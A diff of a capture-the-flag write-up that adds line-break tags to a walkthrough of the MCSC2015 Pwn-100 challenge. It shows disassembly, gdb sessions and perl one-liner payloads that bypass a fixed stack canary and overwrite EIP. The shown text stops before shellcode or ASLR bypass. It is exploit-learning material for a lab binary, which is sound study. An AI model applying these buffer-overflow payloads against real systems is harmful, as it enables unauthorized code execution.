@@ -1,5 +1,5 @@
 #MCSC2015 writeup for Pwn-100
-After establishing ssh connection, here's what are up to :
+After establishing ssh connection, here's what are up to :<br>
 ```
 pwn1@MCSC2015:/challenges/pwn1$ ls -lia
 total 28
@@ -8,7 +8,7 @@ total 28
 13238276 -rw------- 1 pwned1 pwned1    36 mai   18 15:13 FLAG
 13238275 -rws--sr-x 1 pwned1 pwned1 12376 mai   18 15:13 pwn1
 ```
-Let's first check the security of this binary :	
+Let's first check the security of this binary :	<br>
 
 ```
 pwn1@MCSC2015:/challenges/pwn1$ /tmp/checksec.sh --file /challenges/pwn1/pwn1 
@@ -17,9 +17,9 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 pwn1@MCSC2015:/challenges/pwn1$ cat /proc/sys/kernel/randomize_va_space 
 2
 ```
-As it appear, there's no protection exept for ASLR.
-Nothing but good news ... for now !
-Let's look to the binary more closely.
+As it appear, there's no protection exept for ASLR.<br>
+Nothing but good news ... for now !<br>
+Let's look to the binary more closely.<br>
 ```
 080489fe <main>:
  80489fe:	55                   	push   %ebp
@@ -31,7 +31,7 @@ Let's look to the binary more closely.
  8048a0d:	66 90                	xchg   %ax,%ax
  8048a0f:	90                   	nop
 ```
-Nothing too special,a simple call to vuln function:
+Nothing too special,a simple call to vuln function:<br>
 ```
 08048607 <vuln>:
  8048607:	55                   	push   %ebp
@@ -71,11 +71,11 @@ Nothing too special,a simple call to vuln function:
  804867b:	c9                   	leave  
  804867c:	c3                   	ret    
 ```
-This function calls fgets, to get the user's input, then push $0x8048a90.
-Finally a strcmp to compare something with whatever $eax point to.
-let's run gdb to further inspection and break at those :
-Breakpoint 1 at 0x804863a fgets in vuln
-Breakpoint 2 at 0x804864b strcmp in vuln
+This function calls fgets, to get the user's input, then push $0x8048a90.<br>
+Finally a strcmp to compare something with whatever $eax point to.<br>
+let's run gdb to further inspection and break at those :<br>
+Breakpoint 1 at 0x804863a fgets in vuln<br>
+Breakpoint 2 at 0x804864b strcmp in vuln<br>
 ```
 pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
 (gdb) break *0x804863a
@@ -114,25 +114,25 @@ Breakpoint 1, 0x0804864b in vuln ()
 (gdb) x/s $eax
 0xbff16cb8:	"BBB\n"
 ```
-By running our binary with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" nothing happens ( canary is not overwritten)
-However when running with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB", the canary is overwritten with "BBB"
-Bingo !
-(We could find the offset using ltrace to find the offset to the canary as well ...)
-Let's exit gdb and check that again
+By running our binary with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" nothing happens ( canary is not overwritten)<br>
+However when running with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB", the canary is overwritten with "BBB"<br>
+Bingo !<br>
+(We could find the offset using ltrace to find the offset to the canary as well ...)<br>
+Let's exit gdb and check that again<br>
 ```
 pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7Px\x00"' |./pwn1 
 Go away..
 pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00"' |./pwn1 
 pwn1@MCSC2015:/challenges/pwn1$ 
 ```
-I run the program with first a false value of the canary to see if the offset is different from gdb, it can happen xD.
-Canary bypassed! we now just need to complete with some A's to override $eip ...
+I run the program with first a false value of the canary to see if the offset is different from gdb, it can happen xD.<br>
+Canary bypassed! we now just need to complete with some A's to override $eip ...<br>
 
 ```
 pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' |./pwn1 
 Segmentation fault (core dumped)
 ```
-Bingo let's run gdb again to analyse more closely
+Bingo let's run gdb again to analyse more closely<br>
 ```
 pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' > /tmp/input
 pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
@@ -143,11 +143,11 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
 (gdb) 
 ```
-Yum Yum ... we're too close to exploit that binary :)
-You could start by adding a lot of A's, the $eip=0x41414141, you're going to run again with the same input but less A's at the end, still eip=0x41414141, and run again to find the exact offset.
-However,pattern_create.rb and pattern offset.b in the metasploit framework can be handy to find the exact offset to eip without having to bruteforce it.
-Now, we just need to override the $eip to spawn a shell ....
-ASLR is on, remember ? :)
+Yum Yum ... we're too close to exploit that binary :)<br>
+You could start by adding a lot of A's, the $eip=0x41414141, you're going to run again with the same input but less A's at the end, still eip=0x41414141, and run again to find the exact offset.<br>
+However,pattern_create.rb and pattern offset.b in the metasploit framework can be handy to find the exact offset to eip without having to bruteforce it.<br>
+Now, we just need to override the $eip to spawn a shell ....<br>
+ASLR is on, remember ? :)<br>
 
 
 
